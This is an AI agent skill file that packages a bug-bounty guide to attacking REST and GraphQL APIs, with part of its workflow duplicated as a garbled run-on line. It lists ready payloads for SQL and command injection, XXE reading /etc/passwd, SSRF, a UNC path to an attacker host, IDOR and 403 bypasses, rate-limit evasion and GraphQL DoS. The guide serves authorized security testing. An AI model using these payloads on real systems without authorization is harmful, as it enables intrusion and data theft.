---
name: api-fuzzing-bug-bounty-v2
description: "API Fuzzing for Bug Bounty workflow skill. Use this skill when the user needs Provide comprehensive techniques for testing REST, SOAP, and GraphQL APIs during bug bounty hunting and penetration testing engagements. Covers vulnerability discovery, authentication bypass, IDOR exploitation, and API-specific attack vectors and the operator should rely on the packaged workflow, support pack, troubleshooting notes, and provenance links before merging or handing off."
version: "0.0.1"
category: backend
tags: ["api-fuzzing-bug-bounty-v2", "api-fuzzing-bug-bounty", "provide", "comprehensive", "techniques", "for", "testing", "rest"]
complexity: advanced
risk: caution
tools: ["codex-cli", "claude-code", "cursor", "gemini-cli", "opencode"]
source: community
author: "zebbern"
date_added: "2026-04-13"
date_updated: "2026-04-13"
---

# API Fuzzing for Bug Bounty

## Overview

This public intake copy packages `plugins/antigravity-awesome-skills/skills/api-fuzzing-bug-bounty` from `https://github.com/sickn33/antigravity-awesome-skills` into the native Omni Skills editorial shape without hiding its origin.

Use it when the operator needs the upstream workflow, support files, and repository context to stay intact while the public validator and private enhancer continue their normal downstream flow.

The packaged support pack adds a checklist, rubric, playbook, prompt template, router note, and source manifest so reviewers can audit the import as a complete workflow kit instead of a raw file dump.

> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments. # API Fuzzing for Bug Bounty

Imported source sections that did not map cleanly to the public headings are still preserved below or in the support files. Notable imported sections: Purpose, Inputs/Prerequisites, Outputs/Deliverables, API Types Overview, GraphQL-Specific Testing, Endpoint Bypass Techniques.

## When to Use This Skill

Use this section as the trigger filter. It should make the activation boundary explicit before the operator loads files, runs commands, or opens a pull request.

- This skill is applicable to execute the workflow or actions described in the overview.
- Use when the request clearly matches the imported source intent: Provide comprehensive techniques for testing REST, SOAP, and GraphQL APIs during bug bounty hunting and penetration testing engagements. Covers vulnerability discovery, authentication bypass, IDOR exploitation, and....
- Use when the operator should preserve upstream workflow detail instead of rewriting the process from scratch.
- Use when provenance needs to stay visible in the answer, PR, or review packet.
- Use when the support pack, checklist, rubric, and playbook should guide execution before touching code or tools.
- Use when the workflow should remain reviewable in the public intake repo before the private enhancer takes over.

## Operating Table

| Situation | Start here | Why it matters |
| --- | --- | --- |
| First-time use | `references/omni-import-playbook.md` | Establishes the workflow, review packet, and provenance expectations before work begins |
| PR review or merge readiness | `references/omni-import-rubric.md` | Turns the imported skill into a checklist-driven review packet instead of an opaque file copy |
| Source or lineage verification | `scripts/omni_import_print_origin.py` | Confirms repository, branch, commit, and imported path quickly |
| Workflow execution | `references/omni-import-checklist.md` | Gives the operator the smallest useful entry point into the support pack |
| Handoff decision | `agents/omni-import-router.md` | Helps the operator switch to a stronger native skill when the task drifts |

## Workflow

This workflow is intentionally editorial and operational at the same time. It keeps the imported source useful to the operator while still satisfying the public intake standards that feed the downstream enhancer flow.

1. ### Step 1: API Reconnaissance Identify API type and enumerate endpoints: bash # Check for Swagger/OpenAPI documentation /swagger.json /openapi.json /api-docs /v1/api-docs /swagger-ui.html # Use Kiterunner for API discovery kr scan https://target.com -w routes-large.kite # Extract paths from Swagger python3 json2paths.py swagger.json ### Step 2: Authentication Testing bash # Test different login paths /api/mobile/login /api/v3/login /api/magiclink /api/admin/login # Check rate limiting on auth endpoints # If no rate limit → brute force possible # Test mobile vs web API separately # Don't assume same security controls ### Step 3: IDOR Testing Insecure Direct Object Reference is the most common API vulnerability: bash # Basic IDOR GET /api/users/1234 → GET /api/users/1235 # Even if ID is email-based, try numeric /?userid=111 instead of /?userid=user@mail.com # Test /me/orders vs /user/654321/orders IDOR Bypass Techniques: bash # Wrap ID in array {"id":111} → {"id":[111]} # JSON wrap {"id":111} → {"id":{"id":111}} # Send ID twice URL?id=<LEGIT>&id=<VICTIM> # Wildcard injection {"userid":"*"} # Parameter pollution /api/getprofile?userid=<victim>&userid=<legit> {"userid":<legitid>,"userid":<victimid>} ### Step 4: Injection Testing SQL Injection in JSON: json {"id":"56456"} → OK {"id":"56456 AND 1=1#"} → OK {"id":"56456 AND 1=2#"} → OK {"id":"56456 AND 1=3#"} → ERROR (vulnerable!) {"id":"56456 AND sleep(15)#"} → SLEEP 15 SEC Command Injection: bash # Ruby on Rails ?url=Kernel#open → ?url=|ls # Linux command injection api.url.com/endpoint?name=file.txt;ls%20/ XXE Injection: xml <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> SSRF via API: html <object data="http://127.0.0.1:8443"/> <img src="http://127.0.0.1:445"/> .NET Path.Combine Vulnerability: bash # If .NET app uses Path.Combine(path1, path_2) # Test for path traversal https://example.org/download?filename=a.png https://example.org/download?filename=C:\inetpub\wwwroot\web.config https://example.org/download?filename=\\smb.dns.attacker.com\a.png ### Step 5: Method Testing bash # Test all HTTP methods GET /api/v1/users/1 POST /api/v1/users/1 PUT /api/v1/users/1 DELETE /api/v1/users/1 PATCH /api/v1/users/1 # Switch content type Content-Type: application/json → application/xml ---
2. Confirm the user goal, the scope of the imported workflow, and whether this skill is still the right router for the task.
3. Read the overview, playbook, and source summary before loading any upstream support files.
4. Load only the references, examples, prompts, or scripts that materially change the outcome for the current request.
5. Execute the upstream workflow while keeping provenance and source boundaries explicit in the working notes.
6. Validate the result against the checklist, rubric, and expected evidence for the task.
7. Escalate or hand off to a related skill when the work moves out of this imported workflow's center of gravity.

### Imported Workflow Notes

#### Imported: Core Workflow

### Step 1: API Reconnaissance

Identify API type and enumerate endpoints:

```bash
# Check for Swagger/OpenAPI documentation
/swagger.json
/openapi.json
/api-docs
/v1/api-docs
/swagger-ui.html

# Use Kiterunner for API discovery
kr scan https://target.com -w routes-large.kite

# Extract paths from Swagger
python3 json2paths.py swagger.json
```

### Step 2: Authentication Testing

```bash
# Test different login paths
/api/mobile/login
/api/v3/login
/api/magic_link
/api/admin/login

# Check rate limiting on auth endpoints
# If no rate limit → brute force possible

# Test mobile vs web API separately
# Don't assume same security controls
```

### Step 3: IDOR Testing

Insecure Direct Object Reference is the most common API vulnerability:

```bash
# Basic IDOR
GET /api/users/1234 → GET /api/users/1235

# Even if ID is email-based, try numeric
/?user_id=111 instead of /?user_id=user@mail.com

# Test /me/orders vs /user/654321/orders
```

**IDOR Bypass Techniques:**

```bash
# Wrap ID in array
{"id":111} → {"id":[111]}

# JSON wrap
{"id":111} → {"id":{"id":111}}

# Send ID twice
URL?id=<LEGIT>&id=<VICTIM>

# Wildcard injection
{"user_id":"*"}

# Parameter pollution
/api/get_profile?user_id=<victim>&user_id=<legit>
{"user_id":<legit_id>,"user_id":<victim_id>}
```

### Step 4: Injection Testing

**SQL Injection in JSON:**

```json
{"id":"56456"}                    → OK
{"id":"56456 AND 1=1#"}           → OK  
{"id":"56456 AND 1=2#"}           → OK
{"id":"56456 AND 1=3#"}           → ERROR (vulnerable!)
{"id":"56456 AND sleep(15)#"}     → SLEEP 15 SEC
```

**Command Injection:**

```bash
# Ruby on Rails
?url=Kernel#open → ?url=|ls

# Linux command injection
api.url.com/endpoint?name=file.txt;ls%20/
```

**XXE Injection:**

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

**SSRF via API:**

```html
<object data="http://127.0.0.1:8443"/>
<img src="http://127.0.0.1:445"/>
```

**.NET Path.Combine Vulnerability:**

```bash
# If .NET app uses Path.Combine(path_1, path_2)
# Test for path traversal
https://example.org/download?filename=a.png
https://example.org/download?filename=C:\inetpub\wwwroot\web.config
https://example.org/download?filename=\\smb.dns.attacker.com\a.png
```

### Step 5: Method Testing

```bash
# Test all HTTP methods
GET /api/v1/users/1
POST /api/v1/users/1
PUT /api/v1/users/1
DELETE /api/v1/users/1
PATCH /api/v1/users/1

# Switch content type
Content-Type: application/json → application/xml
```

---

#### Imported: Purpose

Provide comprehensive techniques for testing REST, SOAP, and GraphQL APIs during bug bounty hunting and penetration testing engagements. Covers vulnerability discovery, authentication bypass, IDOR exploitation, and API-specific attack vectors.

## Examples

### Example 1: Ask for the upstream workflow directly

```text
Use @api-fuzzing-bug-bounty-v2 to handle <task>. Start with the workflow playbook, load only the upstream files that change the outcome, and keep provenance visible in the answer.
```

**Explanation:** This is the safest starting point when the operator needs the imported workflow, but not the entire repository.

### Example 2: Inspect origin and import state

```bash
python3 skills/api-fuzzing-bug-bounty-v2/scripts/omni_import_print_origin.py
```

**Explanation:** Use this before review or troubleshooting when you need to confirm source repository, branch, commit, and path.

### Example 3: Review the support pack before execution

```bash
python3 skills/api-fuzzing-bug-bounty-v2/scripts/omni_import_list_support_pack.py
```

**Explanation:** This gives the operator a quick inventory of the imported references, examples, scripts, router notes, and manifest files.

### Example 4: Build a reviewer packet

```text
Review @api-fuzzing-bug-bounty-v2 using the checklist, rubric, playbook, and source manifest, then summarize any gaps before merge.
```

**Explanation:** This is useful when the PR is waiting for human review and you want a repeatable audit packet.

### Imported Usage Notes

#### Imported: Examples

### Example 1: IDOR Exploitation

```bash
# Original request (own data)
GET /api/v1/invoices/12345
Authorization: Bearer <token>

# Modified request (other user's data)
GET /api/v1/invoices/12346
Authorization: Bearer <token>

# Response reveals other user's invoice data
```

### Example 2: GraphQL Introspection

```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name}}}}"}'
```

---

## Best Practices

Treat the generated public skill as a reviewable packaging layer around the upstream repository. The checklist, rubric, worksheet, template, and playbook are there to make the import auditable, not to hide the source material.

- Keep the imported skill grounded in the upstream repository; do not invent steps that the source material cannot support.
- Prefer the smallest useful set of support files so the workflow stays auditable and fast to review.
- Keep provenance, source commit, and imported file paths visible in notes and PR descriptions.
- Use the checklist, rubric, worksheet, and playbook together instead of relying on a single section in isolation.
- Treat generated examples as scaffolding; adapt them to the concrete task before execution.
- Route to a stronger native skill when architecture, debugging, design, or security concerns become dominant.



## Troubleshooting

### Problem: The operator skipped the imported context and answered too generically

**Symptoms:** The result ignores the upstream workflow in `plugins/antigravity-awesome-skills/skills/api-fuzzing-bug-bounty`, fails to mention provenance, or does not use the support pack at all.
**Solution:** Re-open the checklist, playbook, source summary, and source manifest. Load only the upstream files that materially change the answer, then restate the provenance before continuing.

### Problem: The imported workflow feels incomplete during review

**Symptoms:** Reviewers can see the generated `SKILL.md`, but they cannot quickly tell which references, examples, or scripts matter for the current task.
**Solution:** Use the operator packet and support-pack listing to point at the exact references, examples, scripts, and router notes that justify the path you took. If the gap is still real, record it in the PR instead of hiding it.

### Problem: The task drifted into a different specialization

**Symptoms:** The imported skill starts in the right place, but the work turns into debugging, architecture, design, security, or release orchestration that a native skill handles better.
**Solution:** Use the router note and related skills section to hand off deliberately. Keep the imported provenance visible so the next skill inherits the right context instead of starting blind.

### Imported Troubleshooting Notes

#### Imported: Troubleshooting

| Issue | Solution |
|-------|----------|
| API returns nothing | Add `X-Requested-With: XMLHttpRequest` header |
| 401 on all endpoints | Try adding `?user_id=1` parameter |
| GraphQL introspection disabled | Use clairvoyance for schema reconstruction |
| Rate limited | Use IP rotation or batch requests |
| Can't find endpoints | Check Swagger, archive.org, JS files |

## Related Skills

- `@00-andruia-consultant` - Use when the work is better handled by that native specialization after this imported skill establishes context.
- `@00-andruia-consultant-v2` - Use when the work is better handled by that native specialization after this imported skill establishes context.
- `@10-andruia-skill-smith` - Use when the work is better handled by that native specialization after this imported skill establishes context.
- `@10-andruia-skill-smith-v2` - Use when the work is better handled by that native specialization after this imported skill establishes context.

## Additional Resources

Use this support matrix and the linked files below as the operational packet for this imported skill. Together they provide the checklist, rubric, template, playbook, router guidance, and manifest that the validator expects to see represented in the public skill.

| Resource family | What it gives the reviewer | Example path |
| --- | --- | --- |
| `references` | checklists, rubrics, playbooks, and source summaries | `references/omni-import-checklist.md` |
| `examples` | prompt packets and usage templates | `examples/omni-import-operator-packet.md` |
| `scripts` | origin inspection and support-pack listing | `scripts/omni_import_list_support_pack.py` |
| `agents` | routing and handoff guidance | `agents/omni-import-router.md` |
| `assets` | machine-readable source manifest | `assets/omni-import-source-manifest.json` |

- [Imported intake checklist](references/omni-import-checklist.md)
- [Imported review rubric](references/omni-import-rubric.md)
- [Imported workflow playbook](references/omni-import-playbook.md)
- [Imported source summary](references/omni-import-source-summary.md)
- [Imported operator packet](examples/omni-import-operator-packet.md)
- [Imported prompt template](examples/omni-import-prompt-template.md)
- [Print origin details](scripts/omni_import_print_origin.py)
- [List support pack](scripts/omni_import_list_support_pack.py)

### Imported Reference Notes

#### Imported: Quick Reference

| Vulnerability | Test Payload | Risk |
|---------------|--------------|------|
| IDOR | Change user_id parameter | High |
| SQLi | `' OR 1=1--` in JSON | Critical |
| Command Injection | `; ls /` | Critical |
| XXE | DOCTYPE with ENTITY | High |
| SSRF | Internal IP in params | High |
| Rate Limit Bypass | Batch requests | Medium |
| Method Tampering | GET→DELETE | High |

---

#### Imported: Tools Reference

| Category | Tool | URL |
|----------|------|-----|
| API Fuzzing | Fuzzapi | github.com/Fuzzapi/fuzzapi |
| API Fuzzing | API-fuzzer | github.com/Fuzzapi/API-fuzzer |
| API Fuzzing | Astra | github.com/flipkart-incubator/Astra |
| API Security | apicheck | github.com/BBVA/apicheck |
| API Discovery | Kiterunner | github.com/assetnote/kiterunner |
| API Discovery | openapi_security_scanner | github.com/ngalongc/openapi_security_scanner |
| API Toolkit | APIKit | github.com/API-Security/APIKit |
| API Keys | API Guesser | api-guesser.netlify.app |
| GUID | GUID Guesser | gist.github.com/DanaEpp/8c6803e542f094da5c4079622f9b4d18 |
| GraphQL | InQL | github.com/doyensec/inql |
| GraphQL | GraphCrawler | github.com/gsmith257-cyber/GraphCrawler |
| GraphQL | graphw00f | github.com/dolevf/graphw00f |
| GraphQL | clairvoyance | github.com/nikitastupin/clairvoyance |
| GraphQL | batchql | github.com/assetnote/batchql |
| GraphQL | graphql-cop | github.com/dolevf/graphql-cop |
| Wordlists | SecLists | github.com/danielmiessler/SecLists |
| Swagger Parser | Swagger-EZ | rhinosecuritylabs.github.io/Swagger-EZ |
| Swagger Routes | swagroutes | github.com/amalmurali47/swagroutes |
| API Mindmap | MindAPI | dsopas.github.io/MindAPI/play |
| JSON Paths | json2paths | github.com/s0md3v/dump/tree/master/json2paths |

---

#### Imported: Inputs/Prerequisites

- Burp Suite or similar proxy tool
- API wordlists (SecLists, api_wordlist)
- Understanding of REST/GraphQL/SOAP protocols
- Python for scripting
- Target API endpoints and documentation (if available)

#### Imported: Outputs/Deliverables

- Identified API vulnerabilities
- IDOR exploitation proofs
- Authentication bypass techniques
- SQL injection points
- Unauthorized data access documentation

---

#### Imported: API Types Overview

| Type | Protocol | Data Format | Structure |
|------|----------|-------------|-----------|
| SOAP | HTTP | XML | Header + Body |
| REST | HTTP | JSON/XML/URL | Defined endpoints |
| GraphQL | HTTP | Custom Query | Single endpoint |

---

#### Imported: GraphQL-Specific Testing

### Introspection Query

Fetch entire backend schema:

```graphql
{__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,args{name,type{name,kind}}}}}}
```

**URL-encoded version:**

```
/graphql?query={__schema{types{name,kind,description,fields{name}}}}
```

### GraphQL IDOR

```graphql
# Try accessing other user IDs
query {
  user(id: "OTHER_USER_ID") {
    email
    password
    creditCard
  }
}
```

### GraphQL SQL/NoSQL Injection

```graphql
mutation {
  login(input: {
    email: "test' or 1=1--"
    password: "password"
  }) {
    success
    jwt
  }
}
```

### Rate Limit Bypass (Batching)

```graphql
mutation {login(input:{email:"a@example.com" password:"password"}){success jwt}}
mutation {login(input:{email:"b@example.com" password:"password"}){success jwt}}
mutation {login(input:{email:"c@example.com" password:"password"}){success jwt}}
```

### GraphQL DoS (Nested Queries)

```graphql
query {
  posts {
    comments {
      user {
        posts {
          comments {
            user {
              posts { ... }
            }
          }
        }
      }
    }
  }
}
```

### GraphQL XSS

```bash
# XSS via GraphQL endpoint
http://target.com/graphql?query={user(name:"<script>alert(1)</script>"){id}}

# URL-encoded XSS
http://target.com/example?id=%C/script%E%Cscript%Ealert('XSS')%C/script%E
```

### GraphQL Tools

| Tool | Purpose |
|------|---------|
| GraphCrawler | Schema discovery |
| graphw00f | Fingerprinting |
| clairvoyance | Schema reconstruction |
| InQL | Burp extension |
| GraphQLmap | Exploitation |

---

#### Imported: Endpoint Bypass Techniques

When receiving 403/401, try these bypasses:

```bash
# Original blocked request
/api/v1/users/sensitivedata → 403

# Bypass attempts
/api/v1/users/sensitivedata.json
/api/v1/users/sensitivedata?
/api/v1/users/sensitivedata/
/api/v1/users/sensitivedata??
/api/v1/users/sensitivedata%20
/api/v1/users/sensitivedata%09
/api/v1/users/sensitivedata#
/api/v1/users/sensitivedata&details
/api/v1/users/..;/sensitivedata
```

---

#### Imported: Output Exploitation

### PDF Export Attacks

```html
<!-- LFI via PDF export -->
<iframe src="file:///etc/passwd" height=1000 width=800>

<!-- SSRF via PDF export -->
<object data="http://127.0.0.1:8443"/>

<!-- Port scanning -->
<img src="http://127.0.0.1:445"/>

<!-- IP disclosure -->
<img src="https://iplogger.com/yourcode.gif"/>
```

### DoS via Limits

```bash
# Normal request
/api/news?limit=100

# DoS attempt
/api/news?limit=9999999999
```

---

#### Imported: Common API Vulnerabilities Checklist

| Vulnerability | Description |
|---------------|-------------|
| API Exposure | Unprotected endpoints exposed publicly |
| Misconfigured Caching | Sensitive data cached incorrectly |
| Exposed Tokens | API keys/tokens in responses or URLs |
| JWT Weaknesses | Weak signing, no expiration, algorithm confusion |
| IDOR / BOLA | Broken Object Level Authorization |
| Undocumented Endpoints | Hidden admin/debug endpoints |
| Different Versions | Security gaps in older API versions |
| Rate Limiting | Missing or bypassable rate limits |
| Race Conditions | TOCTOU vulnerabilities |
| XXE Injection | XML parser exploitation |
| Content Type Issues | Switching between JSON/XML |
| HTTP Method Tampering | GET→DELETE/PUT abuse |

---

#### Imported: Constraints

**Must:**
- Test mobile, web, and developer APIs separately
- Check all API versions (/v1, /v2, /v3)
- Validate both authenticated and unauthenticated access

**Must Not:**
- Assume same security controls across API versions
- Skip testing undocumented endpoints
- Ignore rate limiting checks

**Should:**
- Add `X-Requested-With: XMLHttpRequest` header to simulate frontend
- Check archive.org for historical API endpoints
- Test for race conditions on sensitive operations

---
